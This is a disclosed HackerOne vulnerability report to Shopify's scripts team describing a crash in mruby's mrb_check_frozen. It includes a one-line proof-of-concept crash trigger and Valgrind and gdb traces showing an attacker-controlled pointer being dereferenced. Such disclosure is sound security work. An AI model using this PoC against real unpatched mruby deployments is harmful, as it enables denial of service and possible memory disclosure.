# NULL pointer dereference in `mrb_check_frozen`

## Report Details
- **Report ID**: 621308
- **URL**: https://hackerone.com/reports/621308
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-06-19T21:15:30.505Z
- **Disclosed**: 2019-09-04T13:46:21.053Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===
The following demonstrates a crash:

```
3735928559.remove_instance_variable '@a'
```

Debug info
==========
Valgrind suggests the crash happens due to an invalid read in `mrb_check_frozen`:

```
==4882== Memcheck, a memory error detector
==4882== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==4882== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info
==4882== Command: mruby eraser.rb
==4882==
==4882== Invalid read of size 4
==4882==    at 0x115A64: mrb_check_frozen (mruby.h:1192)
==4882==    by 0x1165F2: mrb_iv_remove (variable.c:524)
==4882==    by 0x17E30B: mrb_obj_remove_instance_variable (kernel.c:642)
==4882==    by 0x16A2CE: mrb_vm_exec (vm.c:1441)
==4882==    by 0x166BD0: mrb_vm_run (vm.c:949)
==4882==    by 0x17AC57: mrb_top_run (vm.c:2837)
==4882==    by 0x153783: mrb_load_exec (parse.y:6318)
==4882==    by 0x153A56: mrb_load_file_cxt (parse.y:6327)
==4882==    by 0x10EE1C: main (mruby.c:270)
==4882==  Address 0xdeadbeef is not stack'd, malloc'd or (recently) free'd
==4882==
==4882==
==4882== Process terminating with default action of signal 11 (SIGSEGV): dumping core
==4882==  Access not within mapped region at address 0xDEADBEEF
==4882==    at 0x115A64: mrb_check_frozen (mruby.h:1192)
==4882==    by 0x1165F2: mrb_iv_remove (variable.c:524)
==4882==    by 0x17E30B: mrb_obj_remove_instance_variable (kernel.c:642)
==4882==    by 0x16A2CE: mrb_vm_exec (vm.c:1441)
==4882==    by 0x166BD0: mrb_vm_run (vm.c:949)
==4882==    by 0x17AC57: mrb_top_run (vm.c:2837)
==4882==    by 0x153783: mrb_load_exec (parse.y:6318)
==4882==    by 0x153A56: mrb_load_file_cxt (parse.y:6327)
==4882==    by 0x10EE1C: main (mruby.c:270)
```

Examining it in gdb shows an attempted dereference of the pointer `o`.

```
1190│ MRB_INLINE void mrb_check_frozen(mrb_state *mrb, void *o)
1191│ {
1192├─> if (MRB_FROZEN_P((struct RBasic*)o)) mrb_frozen_error(mrb, o);
1193│ }
```

The pointer, however, doesn't contain a valid address but a value controlled by
the attacker -- the integer from the POC on which `remove_instance_variable` was
called.

```
(gdb) p o
$2 = (void *) 0xdeadbeef
(gdb) f 1
#1  0x00005555555625f3 in mrb_iv_remove (mrb=0x55555565d260, obj=..., sym=1008) at src/variable.c:524
(gdb) p obj
$3 = {value = {f = 1.8457939563190925e-314, p = 0xdeadbeef, i = 3735928559, sym = 3735928559}, tt = MRB_TT_FIXNUM}
```

The POC seems to work regardless of the number used, including `0`.

==========

Test platform
=============
* Arch Linux

mruby SHA: c53b7cedccf7f5260dc8b4f88c5f93ea550bc5df

Thank you,
Dinko Galetic
Denis Kasak

## Impact

Denial of service, with a possible information leak / arbitrary memory read because of the attacker-controlled address.

## Attachments
- poc
